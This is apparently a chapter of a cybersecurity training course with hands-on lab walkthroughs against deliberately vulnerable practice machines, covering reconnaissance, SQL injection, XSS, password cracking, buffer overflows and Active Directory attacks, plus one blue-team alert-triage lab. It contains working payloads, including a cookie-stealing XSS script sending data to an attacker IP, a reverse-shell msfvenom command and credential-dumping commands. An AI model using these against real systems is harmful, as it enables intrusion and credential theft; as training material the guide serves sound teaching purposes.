# 🧪 Labs & Exercises

## Hands-On Practice — From Beginner to Advanced with Detailed Walkthroughs

---

## Table of Contents

1. [Lab Structure](#lab-structure)
2. [Beginner Labs](#beginner-labs)
3. [Intermediate Labs](#intermediate-labs)
4. [Advanced Labs](#advanced-labs)
5. [Blue Team Labs](#blue-team-labs)
6. [Full Attack Scenarios](#full-attack-scenarios)
7. [Weekly Practice Schedule](#weekly-practice-schedule)

---

## Lab Structure

```
Each lab includes:
├── Objective (what you'll learn)
├── Prerequisites (what you need to know first)
├── Environment Setup (what to install/configure)
├── Step-by-Step Walkthrough
├── Expected Output (so you know you're on track)
├── Challenges (try without the walkthrough)
└── Key Takeaways
```

---

## Beginner Labs

### Lab 1: Network Reconnaissance with Nmap

```
OBJECTIVE: Master port scanning and service enumeration

PREREQUISITES:
- Kali Linux (or any Linux with Nmap)
- Target: Metasploitable 2 VM or TryHackMe room
- Basic networking knowledge

ENVIRONMENT SETUP:
1. Download Metasploitable 2: https://sourceforge.net/projects/metasploitable/
2. Import in VirtualBox/VMware
3. Set network to "Host-Only" (both Kali + Metasploitable)
4. Verify connectivity: ping target_IP

WALKTHROUGH:
═══════════

Step 1: Host Discovery
$ nmap -sn 192.168.56.0/24
→ This finds all alive hosts on the network
→ Expected: Find Metasploitable at its IP

Step 2: Quick Port Scan
$ nmap 192.168.56.101
→ Scans top 1000 ports
→ Expected output: Multiple open ports (21, 22, 23, 25, 80, etc.)

Step 3: Full Port Scan
$ nmap -p- 192.168.56.101
→ Scans ALL 65535 ports (takes longer)
→ You'll find additional ports missed by default scan

Step 4: Service Version Detection
$ nmap -sV -p 21,22,80,445,3306 192.168.56.101
→ Identifies exact service versions
→ These versions are needed to find exploits

Step 5: Script Scanning
$ nmap -sC -sV 192.168.56.101
→ Runs default NSE scripts
→ Finds additional information (anonymous FTP, etc.)

Step 6: Vulnerability Scanning
$ nmap --script=vuln 192.168.56.101
→ Checks for known vulnerabilities
→ Note any CVEs found

Step 7: Complete Scan + Save Results
$ nmap -sC -sV -oA full_scan 192.168.56.101
→ Saves in all formats (.nmap, .xml, .gnmap)

CHALLENGES (try without guide):
1. Find all services running on non-standard ports
2. Determine the exact OS version
3. Check if FTP allows anonymous login
4. Enumerate SMB shares
5. Find the web application running on port 80

KEY TAKEAWAYS:
- Always start with a quick scan, then do targeted deep scans
- Save your scan results for later reference
- Service versions are critical for finding exploits
- NSE scripts can reveal sensitive information automatically
```

### Lab 2: Web Application Vulnerability Discovery (DVWA)

```
OBJECTIVE: Find and exploit SQL Injection and XSS vulnerabilities

PREREQUISITES:
- DVWA installed (comes with Metasploitable or standalone Docker)
- Burp Suite (free Community Edition)
- Basic understanding of HTTP

ENVIRONMENT SETUP:
Option A: DVWA on Metasploitable (already running on port 80)
Option B: Docker: docker run --rm -it -p 80:80 vulnerables/web-dvwa

Login: admin / password
Set Security Level: LOW (DVWA Security page)

WALKTHROUGH - SQL INJECTION:
════════════════════════════

Step 1: Understand the functionality
→ Go to "SQL Injection" page
→ It asks for a User ID (text input)
→ Normal input: Enter "1" → Shows user information
→ This tells you: Input goes into a SQL query

Step 2: Test for SQL injection
→ Enter: 1' 
→ If you get an error → SQL injection is likely!
→ Error shows the query structure

Step 3: Confirm with always-true condition
→ Enter: 1' OR '1'='1
→ Expected: Shows ALL users (not just user 1)
→ This proves: Your input is directly in the SQL query

Step 4: Determine number of columns (for UNION)
→ Enter: 1' ORDER BY 1-- -    (works)
→ Enter: 1' ORDER BY 2-- -    (works)
→ Enter: 1' ORDER BY 3-- -    (error!)
→ Conclusion: Query returns 2 columns

Step 5: Extract database information
→ Enter: 1' UNION SELECT database(),version()-- -
→ Shows: Current database name + MySQL version

Step 6: Extract tables
→ Enter: 1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -
→ Shows: All tables in current database

Step 7: Extract user credentials
→ Enter: 1' UNION SELECT user,password FROM users-- -
→ Shows: All usernames and password hashes!

Step 8: Crack the hashes
→ Copy hashes, identify type (MD5)
→ Use: hashcat -m 0 hashes.txt rockyou.txt
→ Or: crackstation.net (for lab purposes)

WALKTHROUGH - XSS:
═══════════════════

Step 1: Reflected XSS
→ Go to "XSS (Reflected)" page
→ Enter: <script>alert('XSS')</script>
→ Expected: Alert popup appears!
→ This means: Input is reflected without sanitization

Step 2: Stored XSS
→ Go to "XSS (Stored)" page (guestbook)
→ In Message field: <script>alert('Stored XSS')</script>
→ Submit, then refresh page
→ Expected: Alert fires every time page loads!
→ This is more dangerous: affects ALL visitors

Step 3: Cookie stealing (demonstration)
→ In XSS field: <script>document.location='http://YOUR_IP/?c='+document.cookie</script>
→ Start listener: python3 -m http.server 8000
→ When victim visits page, you receive their cookie

CHALLENGES:
1. Complete all DVWA exercises on MEDIUM security
2. Try to bypass HIGH security filters
3. Find and exploit the command injection vulnerability
4. Exploit the file upload vulnerability to get a shell
```

### Lab 3: Password Cracking

```
OBJECTIVE: Understand password hashing and crack various hash types

PREREQUISITES:
- Hashcat or John the Ripper installed
- Wordlist: rockyou.txt (comes with Kali)
- Understanding of hashing concepts

WALKTHROUGH:
════════════

Step 1: Identify hash types
Given hashes:
  a) 5f4dcc3b5aa765d61d8327deb882cf99
  b) $1$salt$encrypted
  c) $6$rounds=5000$salt$encrypted
  d) aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

→ a) MD5 (32 hex chars)
→ b) MD5crypt (Linux, $1$)
→ c) SHA-512crypt (Linux, $6$)
→ d) LM:NTLM hash (Windows)

Step 2: Crack MD5 with hashcat
$ echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
$ hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
→ Result: 5f4dcc3b5aa765d61d8327deb882cf99:password

Step 3: Crack NTLM
$ echo "31d6cfe0d16ae931b73c59d7e0c089c0" > ntlm.txt
$ hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt

Step 4: Use rules for mutations
$ hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
→ Rules add variations: Password → P@ssword, password1, PASSWORD, etc.

Step 5: Create custom wordlist
$ echo "company" > custom.txt
$ echo "2024" >> custom.txt
$ hashcat -m 0 hash.txt custom.txt -r rules/best64.rule --force

CHALLENGES:
1. Crack these hashes (find them at crackmes websites):
   - MD5: 482c811da5d5b4bc6d497ffa98491e38
   - SHA1: 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8
2. Generate a wordlist using CeWL from a target website
3. Create custom hashcat rules for your region's password patterns
```

---

## Intermediate Labs

### Lab 4: Full Machine Exploitation (HTB-Style)

```
OBJECTIVE: Compromise a machine from scratch using methodology

PREREQUISITES:
- Comfortable with Nmap, basic exploitation
- Understanding of Linux file system
- Web application testing basics

TARGET: Use VulnHub "Kioptrix Level 1" or similar easy machine

METHODOLOGY WALKTHROUGH:
════════════════════════

Phase 1: Reconnaissance (20 minutes)
$ nmap -sC -sV -oA recon/initial TARGET_IP
$ nmap -p- --min-rate 5000 -oA recon/allports TARGET_IP

→ Document ALL open ports and services
→ Identify versions (critical for exploit search)
→ Note anything interesting from NSE scripts

Phase 2: Enumeration (30-60 minutes)
For each open service, enumerate deeper:

Web (Port 80/443):
$ gobuster dir -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50
$ nikto -h http://TARGET
→ Browse manually, check source code, check robots.txt
→ Look for: Login pages, version info, comments in HTML

SMB (Port 445):
$ smbclient -L //TARGET -N
$ smbmap -H TARGET
$ enum4linux -a TARGET

SSH (Port 22):
→ Note version (search for exploits)
→ Try common credentials if other services expose usernames

Phase 3: Exploitation (varies)
Based on enumeration findings:
1. Search for version-specific exploits:
   $ searchsploit apache 1.3.20
   $ searchsploit samba 2.2
2. Try identified exploits
3. If web app: test for injection, upload vulnerabilities

Phase 4: Privilege Escalation
Once you have initial shell:
$ whoami
$ id
$ uname -a
$ sudo -l
$ find / -perm -4000 2>/dev/null
→ Transfer LinPEAS: 
$ wget http://ATTACKER:8000/linpeas.sh
$ chmod +x linpeas.sh
$ ./linpeas.sh

Phase 5: Proof
$ cat /root/root.txt (or equivalent flag)
$ cat /home/user/user.txt

KEY METHODOLOGY:
→ 80% of time should be ENUMERATION
→ If stuck: enumerate more, enumerate differently
→ Don't jump to exploitation too quickly
→ Take notes on everything you find
```

### Lab 5: Active Directory Initial Compromise

```
OBJECTIVE: Compromise an AD environment from network access to Domain Admin

PREREQUISITES:
- AD lab set up (see Section 21/28)
- Understanding of AD concepts
- Tools: Responder, CrackMapExec, BloodHound, Impacket

WALKTHROUGH:
════════════

Phase 1: Network Discovery
$ nmap -sn 10.10.10.0/24
→ Identify Domain Controller (usually has DNS, LDAP, Kerberos)
→ Identify workstations and servers

Phase 2: LLMNR/NBT-NS Poisoning
$ sudo responder -I eth0 -wrf
→ Wait for network events (user browsing, misconfigured share)
→ Capture NTLMv2 hash when machine queries for non-existent name

Phase 3: Crack the Hash
$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
→ If password is weak → you now have valid domain credentials

Phase 4: Enumerate with Valid Credentials
$ crackmapexec smb 10.10.10.0/24 -u user -p 'password' --shares
$ bloodhound-python -u user -p 'password' -d corp.local -dc dc01.corp.local -c all
→ Import BloodHound data, analyze attack paths

Phase 5: Kerberoasting
$ impacket-GetUserSPNs corp.local/user:password -dc-ip DC_IP -request
→ Crack TGS ticket offline
$ hashcat -m 13100 tgs_hash.txt wordlist.txt

Phase 6: Lateral Movement
→ Use discovered credentials on other machines
$ crackmapexec smb 10.10.10.0/24 -u svc_sql -p 'cracked_pass' --shares
$ evil-winrm -i TARGET -u svc_sql -p 'cracked_pass'

Phase 7: Domain Admin
→ Find DA credentials through:
   - LSASS dump on machines where DA has logged in
   - DCSync if you have replication permissions
$ impacket-secretsdump corp.local/admin_user:password@DC_IP
```

---

## Advanced Labs

### Lab 6: Buffer Overflow Exploitation

```
OBJECTIVE: Exploit a stack-based buffer overflow to gain code execution

PREREQUISITES:
- Basic understanding of memory layout
- Python scripting
- x86 assembly basics
- Tool: Immunity Debugger + mona.py (Windows target)

TARGET: VulnServer or similar practice application

WALKTHROUGH:
════════════

Step 1: Fuzzing (find crash point)
$ python3 -c "
import socket
buffer = 'A' * 100
while True:
    try:
        s = socket.socket()
        s.connect(('TARGET', 9999))
        s.send(buffer.encode())
        s.close()
        buffer += 'A' * 100
        print(f'Sent {len(buffer)} bytes')
    except:
        print(f'Crashed at {len(buffer)} bytes')
        break
"
→ Note the crash length (e.g., crashed at 2500 bytes)

Step 2: Find exact offset (EIP control)
$ msf-pattern_create -l 2500 > pattern.txt
→ Send pattern to application (replace A's with pattern)
→ Note EIP value at crash in debugger
$ msf-pattern_offset -l 2500 -q EIP_VALUE
→ Output: Exact offset (e.g., 2003)

Step 3: Verify EIP control
payload = 'A' * 2003 + 'B' * 4 + 'C' * (2500-2003-4)
→ Send payload, verify EIP = 42424242 (BBBB)
→ If yes: You control EIP!

Step 4: Find bad characters
→ Send all chars (0x01-0xFF) after EIP overwrite
→ Check in debugger which chars cause issues
→ Common bad chars: 0x00 (null), 0x0a (newline), 0x0d (CR)

Step 5: Find JMP ESP
!mona jmp -r esp -cpb "\x00\x0a\x0d"
→ Find address of JMP ESP instruction
→ This will redirect execution to your shellcode

Step 6: Generate shellcode
$ msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 \
  -b "\x00\x0a\x0d" -f python -v shellcode

Step 7: Final exploit
payload = 'A' * offset + jmp_esp_address + '\x90' * 16 + shellcode
→ Send payload
→ Catch reverse shell on attacker!
```

### Lab 7: Active Directory Full Chain

```
OBJECTIVE: Complete AD compromise using multiple attack vectors

SCENARIO:
- You have network access (assumed breach / evil-maid)
- Domain: megacorp.local
- Goal: Domain Admin → DCSync → Full compromise

ATTACK CHAIN:
1. Responder → NTLMv2 capture → Crack
2. Valid creds → BloodHound enumeration
3. Identify: Kerberoastable accounts
4. Kerberoast → Crack service account password
5. Service account → Local admin on file server
6. Dump LSASS on file server → Find DA cached credentials
7. Pass-the-Hash as DA → DCSync
8. Golden Ticket → Persistent access

[Each step detailed with exact commands in lab environment]
```

---

## Blue Team Labs

### Lab 8: SIEM Alert Investigation

```
OBJECTIVE: Triage SIEM alerts and determine true/false positive

SCENARIO:
Your SIEM fires an alert:
"Multiple failed authentication attempts followed by successful login 
 from IP 185.220.101.45 at 03:42 UTC on user account 'jsmith'"

INVESTIGATION STEPS:
════════════════════

Step 1: Gather Context
→ How many failed attempts? (5? 50? 5000?)
→ Over what time period?
→ Was the successful login immediately after failures?
→ What system was targeted? (VPN, email, workstation?)

Step 2: Enrich the IOC
→ Check 185.220.101.45:
  - AbuseIPDB: Is it a known bad IP?
  - VirusTotal: Any related malware?
  - Geolocation: Expected country for jsmith?
  - ASN: Is it a Tor exit node? VPN provider?
→ In this case: IP is a known Tor exit node (highly suspicious)

Step 3: Check User Activity
→ What did jsmith's account do AFTER the successful login?
→ Check: File access, email sent, VPN session duration
→ Check: Was jsmith traveling? (calendar check)
→ Contact jsmith: "Did you login at 3:42 AM?"

Step 4: Determine Verdict
→ If jsmith confirms it wasn't them:
  - CONFIRMED COMPROMISE
  - Disable account immediately
  - Begin incident response
  - Check for data access/exfiltration
→ If jsmith was traveling through Tor-using country:
  - False positive, but document and close
  - Consider: enforce MFA for this user

Step 5: Document and Close
→ Write investigation notes
→ Update alert status
→ If true positive: Create incident ticket
→ If false positive: Tune detection rule to reduce noise
```

---

## Weekly Practice Schedule

```
Monday: Network Security (1 hour)
├── Practice Nmap scans and enumeration
├── Wireshark packet analysis
└── TryHackMe: 1 networking room

Tuesday: Web Application Security (1 hour)
├── PortSwigger Academy: 2-3 labs
├── Practice with Burp Suite
└── Study one OWASP Top 10 vulnerability

Wednesday: System Exploitation (1.5 hours)
├── HackTheBox: Work on active machine
├── Or TryHackMe: Offensive path room
└── Document methodology and findings

Thursday: Blue Team / Defense (1 hour)
├── Log analysis practice
├── SIEM queries and dashboards
├── Incident response scenarios
└── Detection rule writing

Friday: Active Directory (1 hour)
├── Practice AD attacks in lab
├── BloodHound analysis
├── Understand one new AD attack technique

Weekend: CTF / Projects (2-3 hours total)
├── Participate in weekly CTF
├── Work on portfolio project
├── Write blog post about what you learned
└── Review week's notes
```

---

**Next:** → [28-Home-Lab-Setup](../28-Home-Lab-Setup/README.md)

*"Reading about hacking teaches you concepts. Doing labs teaches you skills. There is no substitute for hands-on practice."*
